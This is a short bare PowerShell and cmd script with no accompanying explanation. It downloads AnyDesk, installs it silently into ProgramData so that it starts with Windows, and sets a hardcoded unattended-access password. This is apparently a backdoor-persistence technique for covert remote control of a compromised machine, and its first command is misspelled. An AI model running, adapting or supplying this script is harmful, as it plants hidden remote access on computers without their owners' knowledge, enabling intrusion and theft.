mkdit "C:\ProgramData\AnyDesk"
$clnt=new-object System.Net.WebClient
$url="http://download.anydesk.com/AnyDesk.exe"
$file="C:\ProgramData\AnyDesk.exe"
$clnt.DownloadFile($url,$file)
cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
cmd.exe /c echo tkddk | C:\ProgramData\anydesk.exe --set-password
